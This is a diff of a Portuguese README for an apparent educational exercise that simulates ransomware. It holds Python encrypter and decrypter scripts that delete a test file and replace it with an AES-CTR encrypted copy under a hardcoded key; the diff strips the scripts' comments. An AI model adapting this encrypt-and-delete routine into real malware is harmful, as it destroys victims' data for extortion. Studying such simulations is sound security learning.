@@ -10,7 +10,7 @@ Fazer a criptografia e descriptografia de um arquivo de teste, simulando um rans
 
 ## Passo a Passo 👣
 
-• Criando o ransomware
+-  Criando o ransomware
 
 ┌──(lucas㉿kali)-[~]
 └─$ mkdir projeto-ransomware
@@ -39,26 +39,25 @@ decrypter.py  encrypter.py  teste.txt
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
+
 
 file_name = 'teste.txt'
 file = open(file_name,'rb')
 file_data = file.read()
 file.close()
 
-## remover o arquivo original
+
 
 os.remove(file_name)
 
-## definir a chave de encriptacao
 
 key = b"testeransomwares"
 aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar arquivo
+
 crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
+
 new_file = file_name + '.ransomwaretroll'
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
@@ -186,23 +185,18 @@ o <  <
 import os
 import pyaes
 
-## abrir o arquivo criptografado
-
 file_name = 'teste.txt.ransomwaretroll'
 file = open(file_name, 'rb')
 file_data = file.read()
 file.close()
 
-##chave de descriptografia
 
 key = b'testeransomwares'
 aes = pyaes.AESModeOfOperationCTR(key)
 decrypt_data = aes.decrypt(file_data)
 
-##Remover o arquivo criptografado
 os.remove(file_name)
 
-##Criar um novo arquivo descriptografado
 
 new_file = 'teste.txt'
 new_file = open(f'{new_file}','wb')
